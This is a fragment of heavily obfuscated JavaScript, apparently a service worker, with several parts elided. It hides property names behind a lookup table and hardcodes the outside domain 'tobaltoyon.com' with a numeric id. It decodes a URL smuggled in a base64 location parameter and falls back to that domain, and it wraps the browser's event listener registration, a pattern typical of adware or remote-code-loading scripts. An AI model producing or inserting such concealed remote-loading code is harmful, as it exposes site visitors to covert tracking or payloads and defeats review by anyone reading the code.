(function (O) {
  !function (e) {
    ...
    n[O.K] = function (e, t, r) {
      if (!n[O.h](e, t)) {
        Object[O.b](e, t, O.Z(O.GO, !O.N, O.RO, r));
      }
    };
    n[O.G] = function (e) {
    ...
    self[O.c] = O.Z(O.S, 7861549, O.V, "tobaltoyon.com", O.l, !O.N);
    self[O.D] = O.F;
    var DEFAULT_URL = [O.Y, O.j][O.A](self[O.c][O.V]);
    var STORE_EVENTS = [O.T, O.u, O.M, O.L, O.n, O.E];
    var url;
    try {
      url = atob(location[O.DO][O.x](O.X));
      if (!url) {
        throw O.q;
      }
    } catch (e) {
    ...
    try {
      ...
      var events = O.Z();
      var listeners = O.Z();
      var realAddEventListener = self[O.yO][O.fO](self);
    ...
    t[O.I] = async function (e, t) {
      ...
      try {
        var c;
        for (var u = n[Symbol[O.QO]](); !(o = (c = u[O.IO]())[O.uO]); o = !O.N) {
          var d = c[O.p];
          try {
    ...
    function i() {
      ...
      var t = e < O.W && Math[O.mO]() > O.k;
      var n = Math[O.mO]()[O.zO](O.wO)[O.x](O.d, O.KO + parseInt(O.AO * Math[O.mO](), O.NO));
